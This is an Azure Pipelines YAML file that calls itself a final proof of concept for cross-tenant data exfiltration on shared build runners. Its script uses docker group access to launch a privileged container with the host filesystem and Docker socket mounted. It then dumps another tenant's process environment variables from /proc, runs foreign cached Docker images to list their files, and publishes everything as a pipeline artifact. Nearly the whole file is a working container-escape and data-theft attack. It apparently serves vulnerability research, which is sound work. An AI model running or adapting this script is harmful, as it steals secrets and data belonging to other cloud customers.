# azure-pipelines.yml
trigger:
- main
pr:
- main

name: $(Date:yyyyMMdd)$(Rev:.r)

stages:
- stage: ConclusiveEvidencePoc
  displayName: 'Final PoC: Cross-Tenant Data Exfiltration'
  jobs:
  - job: Pillage_Runner_Host
    displayName: 'PoC: Exfiltrate Data from Other Tenant Processes and Caches'
    pool:
      vmImage: 'ubuntu-22.04'
    steps:
    - checkout: none
    - task: Bash@3
      displayName: 'Escape Container and Pillage Host for Tenant Data'
      inputs:
        targetType: inline
        script: |
          set -euo pipefail
          mkdir -p artifacts

          echo "--- Verifying container escape vector ---"
          if ! (id | grep -q '(docker)'); then
            echo "❌ CRITICAL FAILURE: User is not in the docker group. Aborting."
            exit 1
          fi
          echo "✅ Confirmed: Container escape vector is present."

          echo "--- ESCAPING CONTAINER to hunt for cross-tenant data ---"
          
          docker run --rm --privileged --network=host --pid=host -v /:/hostfs \
            -v /var/run/docker.sock:/var/run/docker.sock \
            -v $(pwd)/artifacts:/artifacts \
            alpine:latest sh -c "
              apk add --no-cache docker-cli

              # --- PRIMARY VECTOR: PROCESS SNOOPING ---
              echo '--- [HOST] Searching for victim processes from other tenants... ---'
              chroot /hostfs /bin/ps -eo pid,user,cmd > /artifacts/full-process-list.txt
              VICTIM_PID=\$(cat /artifacts/full-process-list.txt | grep -E 'mono.*xsp4' | grep -v 'vsts' | grep -v 'root' | awk '{print \$1}' | head -n 1)

              if [ -n \"\$VICTIM_PID\" ]; then
                echo \"✅ SMOKING GUN 1: Found victim Mono process \$VICTIM_PID. Dumping its environment...\"
                chroot /hostfs /bin/cat /proc/\$VICTIM_PID/environ | tr '\\0' '\\n' | sort > /artifacts/victim-process-environment.txt
              else
                echo 'ℹ️ No active Mono process found in this specific run.' > /artifacts/victim-process-environment.txt
              fi

              # --- SECONDARY VECTOR: DOCKER CACHE PILLAGING ---
              echo '--- [HOST] Searching for foreign Docker images cached by other tenants... ---'
              docker images --format '{{.Repository}}:{{.Tag}}' > /artifacts/host-docker-images.txt
              cat << EOF > /tmp/default_images.txt
              node:20
              node:20-alpine
              moby/buildkit
              node:22
              node:22-alpine
              ubuntu:22.04
              debian:11
              alpine:3.19
              ubuntu:20.04
              node:18-alpine
              node:18
              alpine:3.18
              alpine:3.17
              debian:10
              alpine:3.16
              alpine
              EOF
              grep -ivf /tmp/default_images.txt /artifacts/host-docker-images.txt > /artifacts/foreign-images.txt || true

              if [ -s \"/artifacts/foreign-images.txt\" ]; then
                VICTIM_IMAGE=\$(head -n 1 /artifacts/foreign-images.txt)
                echo \"✅ SMOKING GUN 2: Found foreign image '\$VICTIM_IMAGE'. Dumping its filesystem...\"
                docker run --rm --entrypoint='' \"\$VICTIM_IMAGE\" sh -c 'ls -R /' > /artifacts/victim-image-filesystem.txt 2>&1 || \
                  echo 'Failed to run victim image; it may not have a shell.' > /artifacts/victim-image-filesystem.txt
              else
                echo 'ℹ️ No foreign Docker images found.' > /artifacts/victim-image-filesystem.txt
              fi
            "
          
          echo "--- SCRIPT COMPLETE ---"
          echo "--- Analysis of Victim Process Environment ---"
          if [ -s "artifacts/victim-process-environment.txt" ] && ! grep -q "No active" "artifacts/victim-process-environment.txt"; then
            echo "✅✅✅ Conclusive Evidence Found: Environment variables from another tenant's process:"
            cat artifacts/victim-process-environment.txt
          else
            echo "ℹ️ No leftover process was found on this host."
          fi
          
          echo -e "\n--- Analysis of Foreign Docker Images ---"
          if [ -s "artifacts/foreign-images.txt" ]; then
            VICTIM_IMAGE=$(head -n 1 artifacts/foreign-images.txt)
            echo "✅✅✅ Conclusive Evidence Found: Foreign image '\$VICTIM_IMAGE' discovered in cache."
            echo "--- First 30 lines of its filesystem ---"
            cat artifacts/victim-image-filesystem.txt | head -n 30
          else
             echo "ℹ️ No foreign images were found in the cache on this host."
          fi

    - task: PublishPipelineArtifact@1
      displayName: 'Publish Conclusive Evidence'
      condition: succeededOrFailed()
      inputs:
        targetPath: 'artifacts'
        artifact: 'azure-conclusive-evidence'
